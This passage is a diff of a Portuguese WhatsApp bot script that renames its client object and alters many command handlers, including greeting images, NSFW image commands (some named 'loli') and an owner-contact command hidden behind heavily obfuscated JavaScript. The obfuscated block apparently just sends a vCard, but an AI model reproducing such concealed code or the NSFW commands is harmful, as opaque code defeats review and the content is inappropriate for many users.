-                                    tomioka.sendMessage(from, fs.readFileSync(ran), sticker, {
-                                        contextInfo: null, quoted: ftoko
+                                    client.sendMessage(from, fs.readFileSync(ran), sticker, {
+                                        contextInfo: null, quoted: ftoko ,contextInfo: tomis
                                     })
                                     fs.unlinkSync(media)
                                     fs.unlinkSync(ran)
@@ -9606,7 +8858,7 @@ break
                             .save(ran)
                     } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                         const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                        const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
+                        const media = await client.downloadAndSaveMediaMessage(encmedia)
                         ran = getRandom('.webp')
                         reply(mess.wait)
                         await ffmpeg(`./${media}`)
@@ -9625,7 +8877,7 @@ break
                                 
                                 exec(`webpmux -set exif ${addMetadata('TIOTOMIOKA', '(44) 98220867')} ${ran} -o ${ran}`, async(error) => {
                                     if (error) return reply('erro')
-                                    tomioka.sendMessage(from, fs.readFileSync(ran), sticker, {contextInfo: null, quoted: ftoko})
+                                    client.sendMessage(from, fs.readFileSync(ran), sticker, {contextInfo: null, quoted: ftoko ,contextInfo: tomis})
                                     fs.unlinkSync(media)
                                     fs.unlinkSync(ran)
                                 })
@@ -9641,7 +8893,7 @@ break
 					kapankah = body.slice(1)
 					const elu =['1','2','3','4','5','6']
 					const ule = elu[Math.floor(Math.random() * elu.length)]
-					tomioka.sendMessage(from, ule, text, { contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, ule, text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					break
 case 'clearvp':
 if (!isGroup) return fakegroup (mess.only.group)
@@ -9687,29 +8939,29 @@ vip = `❎@${mentioned[0].split('@')[0]} Você deixou de ser um membro Vip do TO
 mentions(`${vip}`, mentioned, true)   
 break
 					case 'daftarvip': 
-					tomioka.sendMessage(from, daftarvip(prefix) , text, { contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, daftarvip(prefix) , text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					break
 					case 'nekopoi':   
 					
-					tomioka.sendMessage(from, nekopoi(prefix) , text, { contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, nekopoi(prefix) , text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					break
 					case 'cekvip': 
 					if (!isPremium) return fakegroup (mess.only.premium)
-					me = tomioka.user
+					me = client.user
 					uptime = process.uptime()
-					tomioka.sendMessage(from,  `*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*\n*NOME DO BOT:* ꧁𝕋𝕆𝕄𝕀𝕆𝕂𝔸~𝔹𝕆𝕋꧂\n*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*\n『 *𝐕𝐈𝐏 𝐔𝐒𝐄𝐑*』\n*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*\n*•NÚMERO:* *${sender.split("@s.whatsapp.net")[0]}*\n*•STATUS:* *ATIVO*\n*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*\n*STATUS BOT:* *${kyun(uptime)}*\n\n*VOCE É UM MEMBRO PREMIUM😍* \n*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*` , text, { quoted: mek, })
+					client.sendMessage(from,  `*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*\n*NOME DO BOT:* ꧁𝕋𝕆𝕄𝕀𝕆𝕂𝔸~𝔹𝕆𝕋꧂\n*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*\n『 *𝐕𝐈𝐏 𝐔𝐒𝐄𝐑*』\n*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*\n*•NÚMERO:* *${sender.split("@s.whatsapp.net")[0]}*\n*•STATUS:* *ATIVO*\n*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*\n*STATUS BOT:* *${kyun(uptime)}*\n\n*VOCE É UM MEMBRO PREMIUM😍* \n*▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃*` , text, { quoted: mek, })
 					break
 				case 'bomdia':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 					memein = await kagApi.memeindo()
 					buffer = await getBuffer(`https://i.imgur.com/7VL9cFf.jpg`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: 'Bom dia, vcs sao fodas ❤️'})
+					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Bom dia, vcs sao fodas ❤️'})
 					break
 				case 'boatarde':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 					memein = await kagApi.memeindo()
 					buffer = await getBuffer(`https://i.imgur.com/JaO3yoV.jpg`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: 'Boa tarde, rapeize 😎👍'})
+					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Boa tarde, rapeize 😎👍'})
 					break
 case 'hearth':      
 					if (args.length < 1) return fakegroup (mess.blank)
@@ -9717,30 +8969,30 @@ case 'hearth':
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/wood-hearth?teks=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'tai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'tai'})
 					break
 				case 'boanoite':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 					memein = await kagApi.memeindo()
 					buffer = await getBuffer(`https://i.imgur.com/yOFxSUR.jpg`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: 'Boa noite fml ❤️'})
+					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Boa noite fml ❤️'})
 					break
 				case 'lofi':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 					memein = await kagApi.memeindo()
 					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTL9hZBPRo16fIhsIus3t1je2oAU23pQqBpfw&usqp=CAU`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: '️💆'})
+					client.sendMessage(from, buffer, image, {quoted: mek, caption: '️💆'})
 					break
 				case 'malkova':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 					memein = await kagApi.memeindo()
 					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtbo5EcVSGj-IvEVznHIgMZ9vjFptZfvprtg&usqp=CAU`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: '️💆'})
+					client.sendMessage(from, buffer, image, {quoted: mek, caption: '️💆'})
 					break
 				case 'canal':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 					buffer = await getBuffer(`https://rbacelia.sirv.com/IMG-20210624-WA0373.jpg`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, caption:'*canal do Tomioka:*\n\n https://youtube.com/channel/UC8DcGKSSBm7kv2lXsjAmmMQ', quoted: mek} )
+					client.sendMessage(from, buffer, image, {quoted: mek, caption:'*canal do Tomioka:*\n\n https://youtube.com/channel/UC8DcGKSSBm7kv2lXsjAmmMQ', quoted: mek} )
 					break
 //_COMANDOS NSFW
 				case 'loli':
@@ -9748,47 +9000,47 @@ if (isBanned) return reply(mess.only.benned)
 reply('*「 ❗ 」 Aguarde um pouco amigo, a procura da imagem...*')
 anu = await axios.get('https://nekos.life/api/v2/img/neko')
 loliz = await getBuffer(anu.data.url)
-tomioka.sendMessage(from, loliz, image, {quoted: ftoko,contextInfo: null, caption: 'rum'})
+client.sendMessage(from, loliz, image, {quoted: ftoko ,contextInfo: tomis,contextInfo: null, caption: 'rum'})
 break
 case 'loli2':
 if (isBanned) return reply(mess.only.benned)
 reply('*「 ❗ 」 Aguarde um pouco amigo, a procura da imagem...*')
 anu = await axios.get('https://nekos.life/api/v2/img/fox_girl')
 loliz = await getBuffer(anu.data.url)
-tomioka.sendMessage(from, loliz, image, {quoted: ftoko,contextInfo: null, caption: 'rum'})
+client.sendMessage(from, loliz, image, {quoted: ftoko ,contextInfo: tomis,contextInfo: null, caption: 'rum'})
 break
                     case 'neko':
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 				    
 					memein = await kagApi.memeindo()
 					buffer = await getBuffer(`http://brizas-api.herokuapp.com/random/hentai/eroneko?apikey=brizaloka`)
-					tomioka.sendMessage(from, buffer, image, {quoted: ftoko, contextInfo: null, caption: 'Rum️'})
+					client.sendMessage(from, buffer, image, {quoted: ftoko ,contextInfo: tomis, contextInfo: null, caption: 'Rum️'})
 					break
                     case 'hentai':
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
                     
 					buffer = await getBuffer(`http://brizas-api.herokuapp.com/random/hentai/classic?apikey=brizaloka`)
-					tomioka.sendMessage(from, buffer, image, {quoted: ftoko, contextInfo: null, caption: 'rum'})
+					client.sendMessage(from, buffer, image, {quoted: ftoko ,contextInfo: tomis, contextInfo: null, caption: 'rum'})
 					break
 				case 'boanoite':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 					memein = await kagApi.memeindo()
 					buffer = await getBuffer(`https://imgur.com/gallery/4HeRfuO`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: 'boa noite ❤️'})
+					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'boa noite ❤️'})
 					break
 				case 'bomdia':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 					memein = await kagApi.memeindo()
 					buffer = await getBuffer(`https://imgur.com/gallery/zFvzl2S`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: 'bom dia ❤️'})
+					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'bom dia ❤️'})
 					break
 		    	case 'grupoinfo':
 		            if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-                    tomioka.updatePresence(from, Presence.composing)
+                    client.updatePresence(from, Presence.composing)
                     if (!isGroup) return fakegroup (mess.only.group)
-                    ppUrl = await tomioka.getProfilePicture(from) // leave empty to get your own
+                    ppUrl = await client.getProfilePicture(from) // leave empty to get your own
 			        buffer = await getBuffer(ppUrl)
-		            tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: `*NOME* : ${groupName}\n*MEMBRO* : ${groupMembers.length}\n*ADMIN* : ${groupAdmins.length}\n*DESCRIÇÃO* : ${groupDesc}`})
+		            client.sendMessage(from, buffer, image, {quoted: mek, caption: `*NOME* : ${groupName}\n*MEMBRO* : ${groupMembers.length}\n*ADMIN* : ${groupAdmins.length}\n*DESCRIÇÃO* : ${groupDesc}`})
                     break
 				case 'meme':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
@@ -9797,7 +9049,7 @@ break
 					ri = JSON.parse(JSON.stringify(anu));
 					ze =  ri[Math.floor(Math.random() * ri.length)];
 					nye = await getBuffer(ze)
-					tomioka.sendMessage(from, nye, image, { caption: 'cringe️', contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, nye, image, { caption: 'cringe️', contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					 	
 					break
 				case 'rr':
@@ -9805,19 +9057,19 @@ break
                     rate = body.slice(1)
                     ratee = ["Tac... Não disparou","Tac... Não disparou,ainda...","Tac💥 Disparou e você morreu","Tac💥Disparou mas a bala pegou de raspão","A arma falhou","Tac... Por pouco que não dispara...","Tac... A arma estava descarregada"]
                     const cu = ratee[Math.floor(Math.random() * ratee.length)]
-                    tomioka.sendMessage(from, ''+ cu+'', text, { contextInfo: null, quoted: ftoko})
+                    client.sendMessage(from, ''+ cu+'', text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
                     break
 case 'bug':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 const bug = body.slice(5)
- if (args.length > 300) return tomioka.sendMessage(from, 'Máximo 300 caracteres', msgType.text, {quoted: mek})
+ if (args.length > 300) return client.sendMessage(from, 'Máximo 300 caracteres', msgType.text, {quoted: mek})
 var nomor = mek.participant
 teks1 = `[REPORT]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\nErro ou bug: ${bug}`
 var options = {
  text: teks1, 
 contextInfo: {mentionedJid: [sender]}, 
 }
-tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: mek})
+client.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: mek})
 reply("Mensagem enviada ao meu dono; Spam = block + ban.")
 break
 case 'request':
@@ -9825,37 +9077,26 @@ case 'request':
                 if (args.length < 1) return fakegroup (`O que você deseja solicitar? Exemplo: ${prefix}request fitur anime`)
           				
                      const cfrr = body.slice(8)
-                      if (cfrr.length > 300) return tomioka.sendMessage(from, text , 'Desculpe, o texto é muito longo, máximo de 300 textos')
+                      if (cfrr.length > 300) return client.sendMessage(from, text , 'Desculpe, o texto é muito longo, máximo de 300 textos')
                        const ress = `*[REQUEST]*\nNúmero : @${tonor.split("@s.whatsapp.net")[0]}\nPesan : ${cfrr}`
 
                       var options = {
                          text: ress,
                          contextInfo: {mentionedJid: [tonor]},
                      }
-                    tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: mek})
+                    client.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: mek})
                     reply('SUA SOLICITAÇÃO ATINGEU O proprietário do BOT, Solicitações pals /main2 não serão respondidas. ')
                     break
 				case 'dono':
-				  (function(_0x249afd,_0x251517){function _0x5e1e91(_0x4a42c2,_0x2ed74d,_0x2d4339,_0x2a37f4,_0x2d97b3){return _0x1a25(_0x2d4339-0x1c,_0x2a37f4);}function _0xc9df7e(_0x52efc0,_0x215e4f,_0x274576,_0x4169bc,_0x5ca356){return _0x1a25(_0x215e4f- -0x358,_0x52efc0);}function _0x183f40(_0x445663,_0x247eb2,_0x340209,_0x594da6,_0x46a87e){return _0x1a25(_0x46a87e- -0x102,_0x340209);}function _0x4bcc62(_0x1a83ae,_0x2439d3,_0x28be2f,_0x49d789,_0x4d5ee7){return _0x1a25(_0x1a83ae- -0x39,_0x4d5ee7);}var _0x368b7a=_0x249afd();function _0x5cdf2f(_0xe53fdb,_0x2442d0,_0x4bc388,_0x2d0b88,_0x30d040){return _0x1a25(_0x4bc388- -0x1d4,_0xe53fdb);}while(!![]){try{var _0x35417b=-parseInt(_0x5e1e91(0x154,0x154,0x15b,'O$7n',0x158))/(0x16f*0x3+0x105+-0x1*0x551)*(parseInt(_0x4bcc62(0x102,0xed,0xed,0x105,'wTke'))/(0xe3b+-0x962+-0xb1*0x7))+-parseInt(_0x5e1e91(0x15e,0x144,0x14b,'RcRw',0x15a))/(-0x23ce+-0x25ab+0x497c*0x1)+-parseInt(_0x5e1e91(0x154,0x14a,0x154,'fDTz',0x144))/(-0x1d31+0x260e+-0x8d9)+parseInt(_0x5e1e91(0x183,0x176,0x16d,'9Aqq',0x165))/(0xb5*-0x35+0x1*-0xb12+0x6f0*0x7)*(parseInt(_0x5cdf2f('6*SP',-0x98,-0x8f,-0xa0,-0x97))/(-0x45*-0x67+-0x1b0c*-0x1+0x113*-0x33))+-parseInt(_0x4bcc62(0x10f,0x112,0x11e,0x119,'Le91'))/(-0x1a13+0x5*-0x371+-0x1*-0x2b4f)*(-parseInt(_0x183f40(0x1d,0x1a,'VfJn',0x29,0x2a))/(0x806+-0x1fe+-0x600))+-parseInt(_0x5e1e91(0x158,0x13c,0x149,'PI52',0x156))/(0xab7*0x1+-0x62b+-0x4d*0xf)+parseInt(_0x5cdf2f('@iQ9',-0x94,-0x85,-0x6e,-0x6f))/(-0x26f7+-0x1aa2+0x1*0x41a3);if(_0x35417b===_0x251517)break;else _0x368b7a['push'](_0x368b7a['shift']());}catch(_0x361104){_0x368b7a['push'](_0x368b7a['shift']());}}}(_0x4e6e,0x8625+0x60522+0x6e2d*-0x3));var _0x2c3804={};_0x2c3804[_0x1a766d(0x352,0x356,0x354,0x364,'VfJn')+_0x23764a(0x35a,'TD&v',0x35a,0x36a,0x360)+'e']=_0x23764a(0x359,'nIgW',0x377,0x379,0x368)+'KA',_0x2c3804[_0x5a231b('nIgW',-0x1e5,-0x1e2,-0x1f3,-0x208)]=vcard;function _0x4e6e(){var _0x3cd2fc=['W6aDW5ldUa','pmkPm8kTW4G','j8krcmk/WQ3cPSkmWRVcSbijmdK','WO5ozwn+','oCk2Bv7cSW','W53dMXNcMHfEWRFdTKi','uCozBMKj','W6JcRmkoWPxcRG','W7jOWOtcOCko','W5JcRmoMW5JdHWhcP0D5kG','WP/cPe90W6K','yCktW4jSb8ozW7JdRe7dT8oEWRpcQG','WQRcK0VdLZG','xSoDwf3dPa','j8kcWRNdNCkwWRWjhCkCgW','WOddGmkHurNdHSo9ax4lyCk7Dq','WPpcQNeTW54','W58GW7xdM2i','Fu4tWOb2WOXgAq8eW7a','WPpcUgO4W48','W7ZdPNOLDbaLaCkMWO7dJSkFdG','W6Sxnmokua','WOBcGKldOwW','q8otWQxdICo2','vCoSfCoUW6T7W67cJmooWOFcVG','gmkcWRtcLmkQW6/dGsldI8kiACo0WRHr','W6WrkCooxq','WRzrW75shNfoBG','F8ootmoPW74','W458jmkMW78','W61ypSoreq','W7NdQWzjiNn3aq','oSkdWPldPMG','W6LLW5ldSmkU','WOTdwZOM','WRLaA8kisCoyW73cM8oHW5y','W4BdUq1SWRZcRZWohJvfq8oZ','jmk5WO8MW45et8opWPddLCkyu8kwzW','BSorW5tcT3LWnSkPnX1GW6Lc','W4pdTaLGWRZcQJKUbZHZuSoh','W73cJSoxWRZcPG','WPa3bmkQC8oOAeeB','W70mW5NdOeK','WRzwWOq+tXaACepdM8oOdCkh','gmkkWRtcM8oRWRVcSgtdPCkF'];_0x4e6e=function(){return _0x3cd2fc;};return _0x4e6e();}function _0x1be2e6(_0x53eb0c,_0xb56273,_0x2be0c6,_0x3cbd46,_0x1d37bc){return _0x1a25(_0x1d37bc- -0x32,_0xb56273);}function _0x23764a(_0x5510d0,_0x31b233,_0x24278a,_0x23a441,_0x496c7b){return _0x1a25(_0x496c7b-0x235,_0x31b233);}var _0x55ed89={};function _0x5a231b(_0x5b645f,_0x49f084,_0x17eaa6,_0x17bf78,_0xb7286a){return _0x1a25(_0x17bf78- -0x33a,_0x5b645f);}function _0x1a766d(_0x1c8ff1,_0xdf4f40,_0x15926a,_0x31926a,_0x64e440){return _0x1a25(_0x31926a-0x214,_0x64e440);}function _0x1a25(_0x4d4875,_0x2805dd){var _0x22a4d4=_0x4e6e();return _0x1a25=function(_0x15f69f,_0x380f65){_0x15f69f=_0x15f69f-(-0x6e1*0x1+0x1*0x22c5+-0x1abd);var _0x3c4508=_0x22a4d4[_0x15f69f];if(_0x1a25['xPqZYy']===undefined){var _0x28b0e6=function(_0x2d9e7b){var _0x177857='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x22ecfa='',_0x38df67='';for(var _0x1e76dc=-0x2fc+0xf62+-0x2e*0x45,_0xe9fc5e,_0x497d13,_0x74023f=-0x1ae1+0x1d04*-0x1+0x37e5;_0x497d13=_0x2d9e7b['charAt'](_0x74023f++);~_0x497d13&&(_0xe9fc5e=_0x1e76dc%(0x62+-0x162f+0x1*0x15d1)?_0xe9fc5e*(0xbd4+-0x181d+0xc89)+_0x497d13:_0x497d13,_0x1e76dc++%(-0x247f*0x1+0x197*0x6+0x565*0x5))?_0x22ecfa+=String['fromCharCode'](-0x23e+0x32d*0xa+0x1c85*-0x1&_0xe9fc5e>>(-(0x1d02+-0x76+0x232*-0xd)*_0x1e76dc&0x2c8*0xa+-0x1bd6+-0xc*-0x1)):0xa*-0x1a1+-0x1c*0xa9+0x22c6*0x1){_0x497d13=_0x177857['indexOf'](_0x497d13);}for(var _0x58fe1f=-0x407*-0x6+-0x3*0x28a+-0x108c,_0x1e8199=_0x22ecfa['length'];_0x58fe1f<_0x1e8199;_0x58fe1f++){_0x38df67+='%'+('00'+_0x22ecfa['charCodeAt'](_0x58fe1f)['toString'](0x1*0xe5+-0x6e2+0x60d*0x1))['slice'](-(-0x1283*0x1+-0x1*-0x634+0x41b*0x3));}return decodeURIComponent(_0x38df67);};var _0x34e71c=function(_0x109a33,_0x1f4430){var _0x5da1c4=[],_0x5f47b0=0xff*-0x11+-0x1*-0x44d+-0x1*-0xca2,_0x3220aa,_0x47e0dc='';_0x109a33=_0x28b0e6(_0x109a33);var _0x2a1952;for(_0x2a1952=0xe3b+-0x962+-0x49*0x11;_0x2a1952<-0x23ce+-0x25ab+0x4a79*0x1;_0x2a1952++){_0x5da1c4[_0x2a1952]=_0x2a1952;}for(_0x2a1952=-0x1d31+0x260e+-0x8dd;_0x2a1952<0xb5*-0x35+0x1*-0xb12+0x318b*0x1;_0x2a1952++){_0x5f47b0=(_0x5f47b0+_0x5da1c4[_0x2a1952]+_0x1f4430['charCodeAt'](_0x2a1952%_0x1f4430['length']))%(-0x45*-0x67+-0x1b0c*-0x1+0x1db*-0x1d),_0x3220aa=_0x5da1c4[_0x2a1952],_0x5da1c4[_0x2a1952]=_0x5da1c4[_0x5f47b0],_0x5da1c4[_0x5f47b0]=_0x3220aa;}_0x2a1952=-0x1a13+0x5*-0x371+-0x8*-0x569,_0x5f47b0=0x806+-0x1fe+-0x608;for(var _0x50c8fe=0xab7*0x1+-0x62b+-0xc2*0x6;_0x50c8fe<_0x109a33['length'];_0x50c8fe++){_0x2a1952=(_0x2a1952+(-0x26f7+-0x1aa2+0x1*0x419a))%(0x1f3+0x1662+0x7c7*-0x3),_0x5f47b0=(_0x5f47b0+_0x5da1c4[_0x2a1952])%(-0x915*0x1+-0x59*0x19+0x10b*0x12),_0x3220aa=_0x5da1c4[_0x2a1952],_0x5da1c4[_0x2a1952]=_0x5da1c4[_0x5f47b0],_0x5da1c4[_0x5f47b0]=_0x3220aa,_0x47e0dc+=String['fromCharCode'](_0x109a33['charCodeAt'](_0x50c8fe)^_0x5da1c4[(_0x5da1c4[_0x2a1952]+_0x5da1c4[_0x5f47b0])%(0x41b+0x496+0xb*-0xb3)]);}return _0x47e0dc;};_0x1a25['oqjdVz']=_0x34e71c,_0x4d4875=arguments,_0x1a25['xPqZYy']=!![];}var _0x422472=_0x22a4d4[-0x1*-0x18bc+0x4fc*-0x2+0x12*-0xd2],_0x511a9c=_0x15f69f+_0x422472,_0x224681=_0x4d4875[_0x511a9c];return!_0x224681?(_0x1a25['vEyUKV']===undefined&&(_0x1a25['vEyUKV']=!![]),_0x3c4508=_0x1a25['oqjdVz'](_0x3c4508,_0x380f65),_0x4d4875[_0x511a9c]=_0x3c4508):_0x3c4508=_0x224681,_0x3c4508;},_0x1a25(_0x4d4875,_0x2805dd);}function _0x25451f(_0x388124,_0x244071,_0x32ce4c,_0x12e432,_0x231ccc){return _0x1a25(_0x32ce4c- -0x1c,_0x231ccc);}_0x55ed89[_0x5a231b('b01s',-0x1f1,-0x1f1,-0x1fe,-0x1ec)+'d']=ftoko,tomioka[_0x1be2e6(0x102,'%j%v',0x10c,0xfb,0x10b)+_0x1be2e6(0x126,'dcMo',0xfa,0x11f,0x110)+'e'](from,_0x2c3804,MessageType[_0x1be2e6(0x10e,'VfJn',0x130,0x12e,0x119)+'ct'],_0x55ed89),fakegroup(_0x5a231b('Lc1o',-0x213,-0x1f8,-0x1fc,-0x202)+_0x25451f(0x13c,0x128,0x12d,0x11c,'*SVi')+_0x5a231b('@iQ9',-0x1fd,-0x1fd,-0x1ed,-0x1ea)+_0x23764a(0x392,'*SVi',0x38f,0x38f,0x37b)+_0x1be2e6(0x106,'Yx!i',0xf1,0x114,0x107)+_0x23764a(0x39b,'fDTz',0x38b,0x392,0x387)+_0x23764a(0x36b,'fDTz',0x358,0x375,0x36c)+_0x5a231b('RcRw',-0x201,-0x200,-0x211,-0x20c)+_0x25451f(0x118,0x107,0x10e,0x10d,'Q^)7')+_0x1a766d(0x333,0x328,0x343,0x33b,'VfJn')+_0x25451f(0x12a,0x134,0x124,0x11b,'PI52')+_0x5a231b('wTke',-0x1f3,-0x1f5,-0x1ee,-0x1f3)+_0x23764a(0x38b,'AWD]',0x379,0x37c,0x378)+_0x1a766d(0x34b,0x334,0x345,0x345,'4rNY')+_0x23764a(0x378,'$rGh',0x35c,0x361,0x36f)+_0x23764a(0x38d,'Xzit',0x39d,0x39a,0x388)+_0x1be2e6(0xf4,'Lc1o',0xf5,0xf2,0x104));
+				  (function(_0x249afd,_0x251517){function _0x5e1e91(_0x4a42c2,_0x2ed74d,_0x2d4339,_0x2a37f4,_0x2d97b3){return _0x1a25(_0x2d4339-0x1c,_0x2a37f4);}function _0xc9df7e(_0x52efc0,_0x215e4f,_0x274576,_0x4169bc,_0x5ca356){return _0x1a25(_0x215e4f- -0x358,_0x52efc0);}function _0x183f40(_0x445663,_0x247eb2,_0x340209,_0x594da6,_0x46a87e){return _0x1a25(_0x46a87e- -0x102,_0x340209);}function _0x4bcc62(_0x1a83ae,_0x2439d3,_0x28be2f,_0x49d789,_0x4d5ee7){return _0x1a25(_0x1a83ae- -0x39,_0x4d5ee7);}var _0x368b7a=_0x249afd();function _0x5cdf2f(_0xe53fdb,_0x2442d0,_0x4bc388,_0x2d0b88,_0x30d040){return _0x1a25(_0x4bc388- -0x1d4,_0xe53fdb);}while(!![]){try{var _0x35417b=-parseInt(_0x5e1e91(0x154,0x154,0x15b,'O$7n',0x158))/(0x16f*0x3+0x105+-0x1*0x551)*(parseInt(_0x4bcc62(0x102,0xed,0xed,0x105,'wTke'))/(0xe3b+-0x962+-0xb1*0x7))+-parseInt(_0x5e1e91(0x15e,0x144,0x14b,'RcRw',0x15a))/(-0x23ce+-0x25ab+0x497c*0x1)+-parseInt(_0x5e1e91(0x154,0x14a,0x154,'fDTz',0x144))/(-0x1d31+0x260e+-0x8d9)+parseInt(_0x5e1e91(0x183,0x176,0x16d,'9Aqq',0x165))/(0xb5*-0x35+0x1*-0xb12+0x6f0*0x7)*(parseInt(_0x5cdf2f('6*SP',-0x98,-0x8f,-0xa0,-0x97))/(-0x45*-0x67+-0x1b0c*-0x1+0x113*-0x33))+-parseInt(_0x4bcc62(0x10f,0x112,0x11e,0x119,'Le91'))/(-0x1a13+0x5*-0x371+-0x1*-0x2b4f)*(-parseInt(_0x183f40(0x1d,0x1a,'VfJn',0x29,0x2a))/(0x806+-0x1fe+-0x600))+-parseInt(_0x5e1e91(0x158,0x13c,0x149,'PI52',0x156))/(0xab7*0x1+-0x62b+-0x4d*0xf)+parseInt(_0x5cdf2f('@iQ9',-0x94,-0x85,-0x6e,-0x6f))/(-0x26f7+-0x1aa2+0x1*0x41a3);if(_0x35417b===_0x251517)break;else _0x368b7a['push'](_0x368b7a['shift']());}catch(_0x361104){_0x368b7a['push'](_0x368b7a['shift']());}}}(_0x4e6e,0x8625+0x60522+0x6e2d*-0x3));var _0x2c3804={};_0x2c3804[_0x1a766d(0x352,0x356,0x354,0x364,'VfJn')+_0x23764a(0x35a,'TD&v',0x35a,0x36a,0x360)+'e']=_0x23764a(0x359,'nIgW',0x377,0x379,0x368)+'KA',_0x2c3804[_0x5a231b('nIgW',-0x1e5,-0x1e2,-0x1f3,-0x208)]=vcard;function _0x4e6e(){var _0x3cd2fc=['W6aDW5ldUa','pmkPm8kTW4G','j8krcmk/WQ3cPSkmWRVcSbijmdK','WO5ozwn+','oCk2Bv7cSW','W53dMXNcMHfEWRFdTKi','uCozBMKj','W6JcRmkoWPxcRG','W7jOWOtcOCko','W5JcRmoMW5JdHWhcP0D5kG','WP/cPe90W6K','yCktW4jSb8ozW7JdRe7dT8oEWRpcQG','WQRcK0VdLZG','xSoDwf3dPa','j8kcWRNdNCkwWRWjhCkCgW','WOddGmkHurNdHSo9ax4lyCk7Dq','WPpcQNeTW54','W58GW7xdM2i','Fu4tWOb2WOXgAq8eW7a','WPpcUgO4W48','W7ZdPNOLDbaLaCkMWO7dJSkFdG','W6Sxnmokua','WOBcGKldOwW','q8otWQxdICo2','vCoSfCoUW6T7W67cJmooWOFcVG','gmkcWRtcLmkQW6/dGsldI8kiACo0WRHr','W6WrkCooxq','WRzrW75shNfoBG','F8ootmoPW74','W458jmkMW78','W61ypSoreq','W7NdQWzjiNn3aq','oSkdWPldPMG','W6LLW5ldSmkU','WOTdwZOM','WRLaA8kisCoyW73cM8oHW5y','W4BdUq1SWRZcRZWohJvfq8oZ','jmk5WO8MW45et8opWPddLCkyu8kwzW','BSorW5tcT3LWnSkPnX1GW6Lc','W4pdTaLGWRZcQJKUbZHZuSoh','W73cJSoxWRZcPG','WPa3bmkQC8oOAeeB','W70mW5NdOeK','WRzwWOq+tXaACepdM8oOdCkh','gmkkWRtcM8oRWRVcSgtdPCkF'];_0x4e6e=function(){return _0x3cd2fc;};return _0x4e6e();}function _0x1be2e6(_0x53eb0c,_0xb56273,_0x2be0c6,_0x3cbd46,_0x1d37bc){return _0x1a25(_0x1d37bc- -0x32,_0xb56273);}function 